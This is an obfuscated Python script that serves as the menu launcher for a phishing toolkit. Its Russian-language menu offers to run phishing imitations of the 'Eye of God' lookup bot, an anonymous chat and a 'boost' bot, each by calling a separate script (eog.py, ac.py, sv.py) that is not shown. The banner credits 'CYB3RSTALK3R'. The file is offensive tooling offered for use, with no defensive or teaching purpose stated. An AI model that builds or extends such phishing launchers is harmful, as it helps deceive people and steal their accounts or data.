import subprocess #line:1
import sys #line:2
import time #line:3
import colorama #line:4
from colorama import init ,Fore ,Style #line:5
init ()#line:6
red =Fore .RED #line:8
cyan =Fore .CYAN #line:9
blue =Fore .BLUE #line:10
green =Fore .GREEN #line:11
yellow =Fore .YELLOW #line:13
reset =Style .RESET_ALL #line:14
bold =Style .BRIGHT #line:15
def create_sv ():#line:17
    try :#line:18
        subprocess .run (["python",'sv.py'])#line:20
    except Exception :#line:21
        try :#line:22
            subprocess .run (["python3",'sv.py'])#line:24
        except Exception :#line:25
            print ("     Обе попытки запустить скрипт не удалось.")#line:26
def create_eyeofgod ():#line:27
    try :#line:28
        subprocess .run (["python",'eog.py'])#line:30
    except Exception :#line:31
        try :#line:32
            subprocess .run (["python3",'eog.py'])#line:34
        except Exception :#line:35
            print ("     Обе попытки запустить скрипт не удалось.")#line:36
def create_anonchat ():#line:37
    try :#line:38
        subprocess .run (["python",'ac.py'])#line:40
    except Exception :#line:41
        try :#line:42
            subprocess .run (["python3",'ac.py'])#line:44
        except Exception :#line:45
            print ("     Обе попытки запустить скрипт не удалось.")#line:46
import os #line:47
def display_banner ():#line:49
    os .system ('cls'if os .name =='nt'else 'clear')#line:50
    O000OOO0OO0OOOO0O =f"""{red}  
        ╔════════════════════════════════════════════════════════════════════════════════════╗

                    ,----,                        ,--,                                    
                  ,/   .`|,-.----.             ,---.'|                    ,--.       ,--. 
                ,`   .'  :\    /  \            |   | :      ,---,       ,--.'|   ,--/  /| 
              ;    ;     /|   :    \           :   : |   ,`--.' |   ,--,:  : |,---,': / ' 
            .'___,/    ,' |   |  .\ :    ,---,.|   ' :   |   :  :,`--.'`|  ' ::   : '/ /  
            |    :     |  .   :  |: |  ,'  .' |;   ; '   :   |  '|   :  :  | ||   '   ,   
            ;    |.';  ;  |   |   \ :,---.'   ,'   | |__ |   :  |:   |   \ | :'   |  /    
            `----'  |  |  |   : .   /|   |    ||   | :.'|'   '  ;|   : '  '; ||   ;  ;    
                '   :  ;  ;   | |`-' :   :  .' '   :    ;|   |  |'   ' ;.    ;:   '   \   
                |   |  '  |   | ;    :   |.'   |   |  ./ '   :  ;|   | | \   ||   |    '  
                '   :  |  :   ' |    `---'     ;   : ;   |   |  ''   : |  ; .''   : |.  \ 
                ;   |.'   :   : :              |   ,/    '   :  ||   | '`--'  |   | '_\.' 
                '---'     |   | :              '---'     ;   |.' '   : |      '   : |     
                          `---'.|                        '---'   ;   |.'      ;   |,'     
                            `---`                                '---'        '---'      

        ╚════════════════════════════════════════════════════════════════════════════════════╝
                     #  С П А С И Б О   Т Е Б Е   C Y B 3 R S T 4 L K 3 R
                    {yellow}1{reset} - {red}Запуск фишинг Глаз Бога
                    {yellow}2{reset} - {red}Запуск фишинг Анонимного чата
                    {yellow}3{reset} - {red}Запуск фишинг Накрутчик бота
                    {yellow}0{reset} - {red}Выход
    """#line:77
    print (O000OOO0OO0OOOO0O )#line:78
def mainly ():#line:80
    while True :#line:81
        display_banner ()#line:82
        OO0O0OOOOOOOOO00O =input (f"\n              {yellow}root@userTP-LINK:~# >>{reset} ")#line:84
        if OO0O0OOOOOOOOO00O =="1":#line:86
            create_eyeofgod ()#line:87
        elif OO0O0OOOOOOOOO00O =="2":#line:88
            create_anonchat ()#line:89
        elif OO0O0OOOOOOOOO00O =="3":#line:90
            create_sv ()#line:91
        elif OO0O0OOOOOOOOO00O =="0":#line:92
            print ("Выход из программы...")#line:93
            break #line:94
        else :#line:95
            print ("Неверный выбор!")#line:96
if __name__ =="__main__":#line:97
    mainly ()#line:98
